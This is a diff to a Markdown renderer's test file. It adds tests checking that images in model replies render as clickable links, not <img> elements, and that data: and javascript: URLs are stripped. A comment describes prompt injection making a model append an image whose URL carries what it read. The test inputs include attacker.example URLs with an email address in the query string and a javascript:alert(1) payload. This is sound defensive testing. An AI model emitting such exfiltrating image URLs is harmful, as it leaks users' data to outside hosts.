@@ -156,6 +156,61 @@ test("GFM extras the plugin enables render as elements, not literal syntax", asy
   );
 });
 
+// A prompt injection in a note, calendar event or web result can make the model
+// end its reply with an image whose URL carries what it read. An <img> fetches
+// that URL the moment the reply renders, with no click.
+test("a Markdown image never renders an <img>; it becomes a link the user can click", async (t) => {
+  const html = await renderMarkdown(
+    t,
+    [
+      "![](https://attacker.example/p.png?d=alice%40corp.com)",
+      "![Quarterly chart](https://attacker.example/chart.png)",
+      "![relative](//attacker.example/unc.png)",
+      "![reference][pixel]",
+      "",
+      "[pixel]: https://attacker.example/ref.png",
+      "",
+    ].join("\n")
+  );
+
+  assert.ok(!html.includes("<img"), "no image element is produced");
+  const links = [...html.matchAll(/<a\b([^>]*)>([^<]*)<\/a>/g)].map(([, attrs, label]) => ({
+    href: attrs.match(/href="([^"]*)"/)?.[1],
+    attrs,
+    label,
+  }));
+  assert.deepEqual(
+    links.map(({ href, label }) => [href, label]),
+    [
+      [
+        "https://attacker.example/p.png?d=alice%40corp.com",
+        "https://attacker.example/p.png?d=alice%40corp.com",
+      ],
+      ["https://attacker.example/chart.png", "Quarterly chart"],
+      ["//attacker.example/unc.png", "relative"],
+      ["https://attacker.example/ref.png", "reference"],
+    ],
+    "each image is a link labelled with its alt text, or its URL when there is none"
+  );
+  for (const { attrs } of links) {
+    assert.ok(attrs.includes('target="_blank"'), "opens outside the app like other links");
+    assert.ok(attrs.includes('rel="noopener noreferrer"'));
+  }
+});
+
+test("an image whose URL the sanitiser strips keeps only its alt text", async (t) => {
+  const html = await renderMarkdown(
+    t,
+    "![inline chart](data:image/png;base64,iVBORw0KGgo=) ![](javascript:alert(1))\n"
+  );
+
+  assert.ok(!html.includes("<img"), "no image element is produced");
+  assert.ok(!html.includes("<a"), "nothing to link to");
+  assert.ok(html.includes("inline chart"), "the alt text still reads");
+  assert.ok(!html.includes("data:"), "the data: URL is not echoed");
+  assert.ok(!html.includes("javascript:"), "the javascript: URL is not echoed");
+});
+
 test("URL sanitisation is unchanged with the plugin enabled", async (t) => {
   const html = await renderMarkdown(
     t,
